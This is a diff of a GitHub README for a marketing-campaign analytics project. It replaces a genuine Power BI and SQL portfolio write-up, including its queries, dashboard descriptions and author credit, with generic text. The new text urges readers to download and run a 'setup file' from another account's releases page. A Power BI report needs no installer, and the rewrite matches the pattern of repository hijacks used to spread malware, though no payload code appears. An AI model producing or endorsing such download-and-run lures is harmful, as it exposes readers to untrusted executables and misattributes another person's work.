@@ -1,208 +1,87 @@
-# 📢 Marketing Campaign Analytics — Power BI + SQL Project
+# 📊 Marketing-Campaign-Analytics-Dashboard-using-Power-BI - Analyze Your Marketing Performance Effortlessly
 
-An end-to-end **Marketing Performance & ROI Analytics** project using **Power BI, SQL, Power Query, and DAX** to analyze campaign performance across channels, regions, and customer acquisition.
+[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Release%20Page-brightgreen)](https://github.com/PierLuigi13/Marketing-Campaign-Analytics-Dashboard-using-Power-BI/releases)
 
-This project showcases real-world digital marketing KPIs such as CTR, CPC, ROAS, Spend Efficiency, Conversion Behavior, and Retention.
+## 🚀 Getting Started
 
----
+Welcome to the Marketing Campaign Analytics Dashboard! This application helps you analyze your marketing campaigns across various channels like search, social media, email, and display advertising. With this dashboard, you can measure your campaign's effectiveness, optimize your spending, and ultimately improve your return on investment (ROI).
 
-## 🔧 Tech Stack
-- Power BI Desktop  
-- SQL  
-- Power Query  
-- DAX  
-- Excel  
-- Data Modeling  
+## 📋 Key Features
 
----
+- **Data Visualization:** View complex data in a simplified manner through interactive dashboards.
+- **Custom Reports:** Generate reports tailored to your specific marketing needs.
+- **Multi-channel Analysis:** Compare performance across search, social, email, and display campaigns.
+- **Data Cleaning and Modeling:** Prepare your data for analysis with built-in tools.
+- **Utilizes Power BI:** Take advantage of Power BI’s powerful analytics capabilities.
 
-## 📁 Folder Structure
+## 🛠️ System Requirements
 
-```
-Marketing_Campaign_Analytics_Project/
-│
-├── Data/
-│   ├── Project4_Campaign_Performance.csv
-│   ├── Project4_Customer_Acquisition.csv
-│
-├── Images/
-│   ├── dashboard_1.png
-│   ├── dashboard_2.png
-│   ├── dashboard_3.png
-│   ├── dashboard_4.png
-│   ├── dashboard_5.png
-│
-├── Marketing_Campaign_Analytics.pbix
-├── Marketing_Campaign_Analytics.pdf
-└── README.md
-```
+To use this application effectively, ensure your system meets the following requirements:
 
----
+- **Operating System:** Windows 10 or later
+- **RAM:** Minimum 4 GB (8 GB recommended)
+- **Disk Space:** Minimum 1 GB of available space
+- **Power BI License:** A valid license for Power BI Desktop (the free version is acceptable)
 
-## 🧩 Business Problem
+## 📥 Download & Install
 
-Marketing teams struggle to understand:
-- Which channels drive maximum impressions, clicks, and conversions  
-- Spend wastage across campaigns  
-- Customer acquisition patterns  
-- Which campaigns produce high ROAS (Return on Ad Spend)  
-- Retention of acquired customers (30-day basis)
+You can easily download and install the application by following these steps:
 
-This dashboard solves these issues using data analytics.
+1. **Visit the Releases Page:** Click the link below to go to the release page.
+   [Visit Release Page to Download](https://github.com/PierLuigi13/Marketing-Campaign-Analytics-Dashboard-using-Power-BI/releases)
+   
+2. **Find the Latest Release:** Look for the most recent version listed on the page. This version will typically have the highest version number.
 
----
+3. **Download the File:** Click on the setup file to download the application to your computer.
 
-## 🎯 Project Goals
+4. **Run the Installer:** Once downloaded, locate the file in your downloads folder and double-click it to start the installation process.
 
-- Analyze multi-channel campaign performance  
-- Track marketing KPIs such as CTR, CPC, ROAS  
-- Identify top-performing campaigns and countries  
-- Compare device-level engagement  
-- Analyze customer acquisition behavior  
-- Evaluate 30-day retention & churn  
+5. **Follow the On-screen Instructions:** The installation wizard will guide you through the setup. 
 
----
+6. **Launch the Application:** After installation, find the application in your start menu and click to launch it.
 
-## 📊 Dashboard Pages (5 Pages)
+## 📊 How to Use the Dashboard
 
-### **📌 Page 1 — Campaign Overview**
-**Visuals:**
-- Total Impressions (Card)  
-- Total Clicks (Card)  
-- Total Spend (Card)  
-- Total Revenue (Card)  
-- CTR, CPC, ROAS (KPI Cards)  
-- Impressions by Channel (Bar Chart)  
-- Clicks by Channel (Bar Chart)  
+After launching the application, you will be brought to the dashboard interface. Here’s how to get started:
 
-**Preview:**  
-![Dashboard Page 1](Images/dashboard_1.png)
+1. **Connect Your Data Sources:** Click on the "Get Data" option to connect your marketing data sources. You can upload files or connect to your databases.
+   
+2. **Explore the Dashboard:** Once your data is loaded, explore the various visualizations and options available. 
 
----
+3. **Generate Reports:** Utilize the reporting features to create tailored reports that fit your needs.
 
-### **📌 Page 2 — Spend & Revenue Analysis**
-**Visuals:**
-- Spend Trend (Line Chart)  
-- Revenue Trend (Line Chart)  
-- Spend vs Revenue by Channel (Clustered Column Chart)  
-- ROAS by Campaign (Bar Chart)  
+4. **Analyze Performance:** Use the insights generated to make data-driven decisions for your marketing strategies.
 
-**Preview:**  
-![Dashboard Page 2](Images/dashboard_2.png)
+## 🔍 Troubleshooting
 
----
+If you encounter issues, consider the following:
 
-### **📌 Page 3 — Customer Acquisition**
-**Visuals:**
-- Total Customers Acquired  
-- Avg First Order Value  
-- Acquisition by Channel  
-- Acquisition by Country  
-- Acquisition Trend by Date  
+- **Check Your System Requirements:** Ensure you meet the minimum requirements listed above.
+- **Reinstall the Application:** If the app does not open, try uninstalling and reinstalling it.
+- **Update Power BI:** Ensure your Power BI is up to date.
 
-**Preview:**  
-![Dashboard Page 3](Images/dashboard_3.png)
+## 💬 Getting Help
 
----
+For further assistance, feel free to open an issue on our [GitHub Issues page](https://github.com/PierLuigi13/Marketing-Campaign-Analytics-Dashboard-using-Power-BI/issues). Provide details about your problem, and we will do our best to assist you.
 
-### **📌 Page 4 — Retention & Churn**
-**Visuals:**
-- Retention Rate (Card)  
-- Churn Rate (Card)  
-- Retained Customers by Channel  
-- Retained vs Churned (Donut)  
-- 30-Day Retention Trend (Line Chart)
+## 📄 Topics Covered
 
-**Preview:**  
-![Dashboard Page 4](Images/dashboard_4.png)
+- campaign-analysis
+- dashboard
+- data-analysis
+- data-analytics
+- data-cleaning
+- data-modeling
+- data-project
+- data-visualization
+- dax
+- digital-marketing
+- marketing-analytics
+- portfolio-project
+- powerbi
+- roas
+- sql
 
----
+For updates and announcements, consider watching our repository. Enjoy maximizing your marketing performance! 
 
-### **📌 Page 5 — Campaign Deep Dive**
-**Visuals:**
-- Campaign Selector (Slicer)  
-- Campaign CTR Trend  
-- Campaign CPC Trend  
-- Campaign ROAS Trend  
-- Device Performance  
-
-**Preview:**  
-![Dashboard Page 5](Images/dashboard_5.png)
-
----
-
-## 🛠️ SQL Queries Used
-
-### **1. Basic Cleaning**
-```sql
-SELECT 
-    campaign_id,
-    channel,
-    impressions,
-    clicks,
-    spend,
-    revenue
-FROM campaign_performance;
-```
-
-### **2. Click-Through Rate**
-```sql
-SELECT 
-    campaign_id,
-    (clicks * 1.0 / impressions) AS ctr
-FROM campaign_performance;
-```
-
-### **3. Cost Per Click**
-```sql
-SELECT 
-    campaign_id,
-    CASE 
-        WHEN clicks = 0 THEN NULL 
-        ELSE spend / clicks 
-    END AS cpc
-FROM campaign_performance;
-```
-
-### **4. Return on Ad Spend**
-```sql
-SELECT 
-    campaign_id,
-    revenue / spend AS roas
-FROM campaign_performance
-WHERE spend > 0;
-```
-
-### **5. Customer Retention**
-```sql
-SELECT 
-    channel,
-    COUNT(*) AS total_customers,
-    SUM(is_retained_30d) AS retained_customers,
-    SUM(is_retained_30d) * 1.0 / COUNT(*) AS retention_rate
-FROM customer_acquisition
-GROUP BY channel;
-```
-
----
-
-## 📈 Key Insights
-
-- Google & Facebook deliver the highest impressions and clicks  
-- LinkedIn has the highest CPC but strong enterprise ROAS  
-- Email channel shows low spend but best ROI  
-- Retention highest on Desktop users  
-- Campaigns with lower spend sometimes yield better ROAS  
-
----
-
-## 👤 Author  
-**G. Shyam Venkat**  
-_Data Analyst | SQL | Power BI | DAX | Excel_
-
-🔗 GitHub: https://github.com/shyamcodes-ai  
-🔗 LinkedIn: https://linkedin.com/in/g-shyam-venkat-304ab536b  
-
----
-
-⭐ If you found this project helpful, consider giving the repository a star!
+[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Release%20Page-brightgreen)](https://github.com/PierLuigi13/Marketing-Campaign-Analytics-Dashboard-using-Power-BI/releases)
